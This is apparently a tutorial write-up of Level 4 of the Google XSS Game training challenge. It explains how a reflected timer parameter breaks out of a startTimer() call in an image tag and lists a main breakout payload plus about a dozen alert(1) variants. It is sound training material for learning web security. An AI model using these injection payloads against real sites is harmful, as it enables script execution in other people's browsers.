<h1>Level 4 - Google XSS Challenge</h1>

![image](https://github.com/user-attachments/assets/f7a468b8-6d48-45e5-9814-9906a1a08bf2)

<h2>Scenario</h2>

Level 4 is an example of Reflected XSS. The malicious user input is sent to the server and processed later on and then inputted into an image tag, allowing us to breakout of a JavaScript function.

1. When a user inputs a number into the timer field and then clicks "Create Timer", that user-inputted number is placed in a timer= parameter and sent to the server. The timer value (which is supposed to be an interger for number of seconds) is then used in the startTimer() function in an image tag. Analyze the next 4 images.

![image](https://github.com/user-attachments/assets/a7070db0-60e9-445f-98f2-7e9650b8491e)

![image](https://github.com/user-attachments/assets/f6e01892-44d3-4f9a-b229-3ea48cecff71)

![image](https://github.com/user-attachments/assets/6d6faade-e76b-4a68-867c-3964e79f5bda)

![image](https://github.com/user-attachments/assets/96057e33-d854-47c2-9b6f-55d204b351f1)

2. Let's check how to Breakout of the startTimer() function in the image tag. I will input "THIS-IS-WHERE-WE-NEED-TO-BREAKOUT" into the timer parameter and then we'll check the page source. By looking at the page source, we will know how to breakout of the startTimer() button. Analyze the next 4 images and notice we can breakout and achieve a JavaScript alert(1) with the following payload: ```')-alert(1)//```

![image](https://github.com/user-attachments/assets/0e7a0462-5713-4bf5-9d44-dea1d7764665)

![image](https://github.com/user-attachments/assets/49840a0d-ba82-4cf9-a884-57bc75522fe1)

![image](https://github.com/user-attachments/assets/afd3c761-a457-4319-aef0-32a1447b62d2)

![image](https://github.com/user-attachments/assets/465953c9-6338-4192-b9a6-59780a53938f)

<h2>Alternative Successful Payloads To Achieve Javascript Execution On Level 4</h2>

```
')**alert(1)//
')*alert(1)//
')%alert(1)//
')|alert(1)//
')||alert(1)//
')%26alert(1)//
')?1:alert(1)//
'),alert(1)//
')(alert(1))//
')/alert(1)//
')%0dalert(1)//
')%0aalert(1)//
')%0d%0aalert(1)//
```
